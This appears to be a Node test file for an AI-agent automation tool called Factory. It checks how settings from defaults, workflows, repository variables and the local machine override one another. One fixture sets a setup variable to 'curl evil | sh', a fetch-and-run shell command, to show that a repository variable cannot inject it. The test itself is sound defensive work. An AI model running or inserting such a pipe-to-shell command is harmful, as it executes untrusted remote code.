import "./temp.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { createServer } from "node:http";
import { fileURLToPath } from "node:url";
import { WORKFLOW_ONLY_SETTINGS, VARIABLE_SETTINGS, WORKFLOW_SETTINGS, layerLines, machineSettings, settingLayers, variableSettings } from "../scripts/lib/inputs.mjs";
import { Local } from "../scripts/local.mjs";
import { doctorSettings, settingsRows } from "../scripts/doctor.mjs";

// A repository's settings in layers: Factory's defaults, the workflow's env block, repository variables, this machine (#284).

const LAUNCH = fileURLToPath(new URL("../scripts/launch.mjs", import.meta.url));
const INPUTS = fileURLToPath(new URL("../scripts/lib/inputs.mjs", import.meta.url));

test("settingLayers: each layer over the one below; a variable never sets a setting only the workflow file sets; another harness drops the models below it", () => {
  for (const n of ["CREDENTIAL", "AUTO_MERGE", "NOTIFY", "MAINTAINERS", "PROTECTED_PATHS", "ALLOWED_DOMAINS", "LOCAL_DOMAINS", "WORKER_SECRETS", "LOCAL_ENV", "SANDBOX", "HARNESS_VERSION", "SETUP", "INSTALL", "BUDGET_COMMAND", "LOCAL_SETUP", "LOCAL_DB"]) {
    assert.ok(WORKFLOW_ONLY_SETTINGS.has(`FACTORY_${n}`) && !VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
  }
  for (const n of ["MAX_CONCURRENT", "LOCAL_MAX_CONCURRENT", "DAILY_USD", "MAX_USD", "MODEL", "EFFORT", "VALIDATION", "SWEEP_MAX_DESTROYS"]) assert.ok(VARIABLE_SETTINGS.has(`FACTORY_${n}`), n);
  for (const k of VARIABLE_SETTINGS) assert.ok(WORKFLOW_SETTINGS.has(k), `${k} is a setting`);

  assert.deepEqual(variableSettings({ FACTORY_MAX_USD: "5", factory_daily_usd: "40", FACTORY_AUTO_MERGE: "false", FACTORY_APP_TOKEN: "x", FACTORY_MODEL: "", OTHER: "y" }), {
    kept: { FACTORY_MAX_USD: "5", FACTORY_DAILY_USD: "40" },
    excluded: ["FACTORY_AUTO_MERGE"],
    unknown: ["FACTORY_APP_TOKEN"],
  });

  const workflow = { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_USD: "25", FACTORY_LOCAL_MAX_CONCURRENT: "1", FACTORY_SETUP: "" };
  const l = settingLayers({ workflow, variables: { FACTORY_MAX_USD: "10", FACTORY_LOCAL_MAX_CONCURRENT: "2", FACTORY_SETUP: "curl evil | sh" }, machine: machineSettings({ FACTORY_LOCAL_MAX_CONCURRENT: "4", FACTORY_MAX_USD: "99", FACTORY_LOCAL_TOKEN: "t" }) });
  assert.deepEqual(l.values, { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_USD: "10", FACTORY_LOCAL_MAX_CONCURRENT: "4", FACTORY_SETUP: "" });
  assert.deepEqual(l.from, { FACTORY_HARNESS: "workflow", FACTORY_MODEL: "workflow", FACTORY_MAX_USD: "variable", FACTORY_LOCAL_MAX_CONCURRENT: "machine", FACTORY_SETUP: "workflow" });
  assert.deepEqual(l.excluded, ["FACTORY_SETUP"], "named, and ignored");

  // The workflow's models belong to its harness: a variable that picks another drops them, unless it sets its own.
  assert.deepEqual(settingLayers({ workflow, variables: { FACTORY_HARNESS: "codex" } }).values.FACTORY_MODEL, undefined);
  assert.equal(settingLayers({ workflow, variables: { FACTORY_HARNESS: "codex", FACTORY_MODEL: "gpt-x" } }).values.FACTORY_MODEL, "gpt-x");
  assert.equal(settingLayers({ workflow, variables: { FACTORY_HARNESS: "Claude" } }).values.FACTORY_MODEL, "claude-opus-5-5", "the same harness keeps them");

  const lines = layerLines(l);
  assert.deepEqual(lines.slice(0, 4), ['FACTORY_HARNESS: "claude" (workflow)', 'FACTORY_LOCAL_MAX_CONCURRENT: "4" (this machine)', 'FACTORY_MAX_USD: "10" (repository variable)', 'FACTORY_MODEL: "claude-opus-5-5" (workflow)']);
  assert.match(lines[4], /^Factory's defaults: .*FACTORY_DAILY_USD, .*FACTORY_SETUP, /, "an empty workflow value reads as the default");
  assert.equal(lines[5], "repository variable FACTORY_SETUP ignored: only the reviewed workflow file sets it");
});

/** Runs `code` in a fresh Node process with `env` (its FACTORY_* settings as the workflow's env block on Actions), as action.yml's run step starts a script. */
function onActions(code, env) {
  return execFileSync(process.execPath, ["--input-type=module", "-e", code], { encoding: "utf8", env: { PATH: process.env.PATH, HOME: process.env.HOME, TMPDIR: process.env.TMPDIR, GITHUB_ACTIONS: "true", ...env } });
}

test("on Actions the workflow's `vars` input lays the repository's variables over the env block before any script reads a setting, and the launcher hands them to the cloud sandbox's stage (#284)", () => {
  const block = { FACTORY_HARNESS: "claude", FACTORY_MODEL: "claude-opus-5-5", FACTORY_MAX_CONCURRENT: "3", FACTORY_MAX_USD: "25", FACTORY_TIMEOUT_MINUTES: "240", FACTORY_AUTO_MERGE: "true" };
  const vars = { FACTORY_MAX_CONCURRENT: "6", FACTORY_MAX_USD: "10", FACTORY_AUTO_MERGE: "false", FACTORY_TIMEOUT_MINUTES: "300", ANTHROPIC_OIDC_EXCHANGE_URL: "https://x" };
  const code = `const { stageEnvironment } = await import(${JSON.stringify(LAUNCH)});
const { resolveInputs } = await import(${JSON.stringify(INPUTS)});
const inputs = resolveInputs({ args: { repo: "o/r" } });
const stage = stageEnvironment({ inputs, stage: "work", issue: 7, claim: "c", tokens: { write: "w" } });
console.log(JSON.stringify({ left: process.env.FACTORY_INPUT_VARS ?? null, inputs: { maxConcurrent: inputs.maxConcurrent, maxUsd: inputs.maxUsd, autoMerge: inputs.autoMerge, timeoutMinutes: inputs.timeoutMinutes, model: inputs.model }, stage: { max: stage.FACTORY_MAX_CONCURRENT, usd: stage.FACTORY_MAX_USD, merge: stage.FACTORY_AUTO_MERGE, vars: Object.keys(stage).filter((k) => k.endsWith("_VARS")) } }));`;
  const out = onActions(code, { ...block, FACTORY_INPUT_VARS: JSON.stringify(vars) });
  const result = JSON.parse(out.trim().split("\n").at(-1));
  assert.deepEqual(result, {
    left: null,
    inputs: { maxConcurrent: 6, maxUsd: 10, autoMerge: true, timeoutMinutes: 240, model: "claude-opus-5-5" },
    stage: { max: "6", usd: "10", merge: "true", vars: [] },
  });
  assert.match(out, /repository variables set FACTORY_MAX_CONCURRENT="6", FACTORY_MAX_USD="10" over the workflow's env block/);
  assert.match(out, /repository variable FACTORY_AUTO_MERGE ignored: only the reviewed workflow file sets it/);
  assert.match(out, /repository variable FACTORY_TIMEOUT_MINUTES 300 is over the workflow's 240, the runner jobs' own timeout-minutes: kept at 240 on Actions/);
  assert.doesNotMatch(out, /ANTHROPIC_OIDC/, "not Factory's: no prefix");

  // A harness picked by a variable takes its own models, as the install step installs it (action.yml).
  const codex = JSON.parse(onActions(`const { resolveInputs } = await import(${JSON.stringify(INPUTS)}); const i = resolveInputs({ args: {} }); console.log(JSON.stringify([i.harness, i.model]));`, { ...block, FACTORY_INPUT_VARS: JSON.stringify({ FACTORY_HARNESS: "codex" }) }).trim().split("\n").at(-1));
  assert.deepEqual(codex, ["codex", "gpt-6.1-sol"]);

  // A workflow rendered without the input: no variable layer.
  const none = JSON.parse(onActions(`const { resolveInputs } = await import(${JSON.stringify(INPUTS)}); console.log(JSON.stringify(resolveInputs({ args: {} }).maxConcurrent));`, block).trim());
  assert.equal(none, 3);
});

/** A GitHub whose variables list answers `answer()`: {status}, or {vars}. Returns the server's URL, its requests, and close. */
async function variablesHost(answer) {
  const asked = [];
  const server = createServer((req, res) => {
    asked.push(new URL(req.url, "http://x").pathname);
    const a = answer();
    if (a.status) return res.writeHead(a.status, { "content-type": "application/json" }).end(JSON.stringify({ message: "Resource not accessible by personal access token" }));
    res.writeHead(200, { "content-type": "application/json" }).end(JSON.stringify({ total_count: 1, variables: Object.entries(a.vars).map(([name, value]) => ({ name, value })) }));
  });
  await new Promise((ok) => server.listen(0, "127.0.0.1", ok));
  return { url: `http://127.0.0.1:${server.address().port}`, asked, close: () => new Promise((ok) => server.close(ok)) };
}

async function withApi(url, fn) {
  const before = process.env.GITHUB_API_URL;
  process.env.GITHUB_API_URL = url;
  const lines = [];
  const write = process.stdout.write;
  process.stdout.write = (chunk, ...rest) => (lines.push(String(chunk)), write.call(process.stdout, chunk, ...rest));
  try {
    await fn();
  } finally {
    process.stdout.write = write;
    if (before === undefined) delete process.env.GITHUB_API_URL;
    else process.env.GITHUB_API_URL = before;
  }
  return lines.join("");
}

test("serve's start: the repository's variables over the workflow, each setting printed with its layer, an ignored variable named; a token without Variables: read warns and the workflow's values stand (#284)", async () => {
  let answer = { vars: { FACTORY_MAX_CONCURRENT: "5", FACTORY_NOTIFY: "someone#1" } };
  const host = await variablesHost(() => answer);
  const start = () => Object.assign(Object.create(Local.prototype), { repo: { owner: "o", name: "r", full: "o/r" }, token: "t", settingsBranch: "main", workflowWf: { FACTORY_MAX_CONCURRENT: "2", FACTORY_MODEL: "m" } });
  try {
    let loop = start();
    const text = await withApi(host.url, async () => {
      await loop.readVariables();
      loop.startSettings();
    });
    assert.deepEqual(host.asked, ["/repos/o/r/actions/variables"]);
    assert.deepEqual(loop.wf, { FACTORY_MAX_CONCURRENT: "5", FACTORY_MODEL: "m" });
    assert.match(text, /settings, each over the one below \(Factory's defaults, the workflow on origin\/main, the repository's variables, this machine\):/);
    assert.match(text, /  FACTORY_MAX_CONCURRENT: "5" \(repository variable\)\n/);
    assert.match(text, /  FACTORY_MODEL: "m" \(workflow\)\n/);
    assert.match(text, /  Factory's defaults: .*FACTORY_DAILY_USD/);
    assert.match(text, /repository variable FACTORY_NOTIFY ignored: only the reviewed workflow file sets it/);

    answer = { status: 403 };
    loop = start();
    const refused = await withApi(host.url, async () => {
      await loop.readVariables();
      await loop.readVariables();
      loop.startSettings();
    });
    assert.equal(refused.split("the local token cannot read this repository's variables (HTTP 403)").length - 1, 1, "said once");
    assert.match(refused, /give the token Variables: read/);
    assert.equal(loop.wf.FACTORY_MAX_CONCURRENT, "2", "the workflow's value stands");
  } finally {
    await host.close();
  }
});

test("doctor: the settings row names each setting's layer; in local mode a token without Variables: read is a WARN with the fix (#284)", async () => {
  let answer = { vars: { FACTORY_DAILY_USD: "40", FACTORY_SANDBOX: "vercel" } };
  const host = await variablesHost(() => answer);
  try {
    let r;
    await withApi(host.url, async () => {
      r = await doctorSettings({ args: { checkout: "/nowhere" }, checkout: "/nowhere", repo: { owner: "o", name: "r", full: "o/r" }, token: "app", varsToken: "local", env: { FACTORY_LOCAL_MAX_CONCURRENT: "3" }, local: true });
    });
    assert.equal(r.inputs.dailyUsd, 40);
    const rows = settingsRows(r.layers);
    assert.equal(rows[0].name, "settings");
    assert.match(rows[0].detail, /FACTORY_DAILY_USD: "40" \(repository variable\)/);
    assert.match(rows[0].detail, /FACTORY_LOCAL_MAX_CONCURRENT: "3" \(this machine\)/);
    assert.deepEqual([rows[1].status, rows[1].detail], ["WARN", "repository variable FACTORY_SANDBOX ignored: only the reviewed workflow file sets it"]);
    assert.equal(r.inputs.sandbox, "", "ignored");

    answer = { status: 404 };
    await withApi(host.url, async () => {
      r = await doctorSettings({ args: { checkout: "/nowhere" }, checkout: "/nowhere", repo: { owner: "o", name: "r", full: "o/r" }, token: "app", varsToken: "local", env: {}, local: true });
    });
    assert.deepEqual(r.checks.map((c) => [c.status, c.name, c.fix]), [["WARN", "repository variables", "give the local token Variables: read (docs/LOCAL.md, Set it up)"]]);
    assert.match(r.checks[0].detail, /^the local token cannot read the repository's variables \(HTTP 404\), so the checks take the workflow's values and so does local mode on this machine$/);
    assert.equal(r.inputs.dailyUsd, 100);
  } finally {
    await host.close();
  }
});

test("doctor warns when a Factory step of the installed workflow passes no vars: the variables do not apply on Actions there (#284)", async () => {
  const { varsInputCheck } = await import("../scripts/doctor.mjs");
  const { renderWorkflow } = await import("../scripts/setup.mjs");
  const { readFileSync } = await import("node:fs");
  const rendered = renderWorkflow(readFileSync(new URL("../workflow-template.yml", import.meta.url), "utf8"), { harness: "claude", runs_on: "ubuntu-latest" });
  assert.equal(varsInputCheck(rendered).status, "PASS");
  const older = rendered.replace(/, vars: "\$\{\{ toJSON\(vars\) \}\}"/, "");
  const c = varsInputCheck(older);
  assert.equal(c.status, "WARN");
  assert.match(c.detail, /^1 of the workflow's \d+ Factory steps passes no vars, so the repository's FACTORY_\* variables do not apply on Actions there$/);
  assert.equal(varsInputCheck("jobs: {}\n"), null);
});
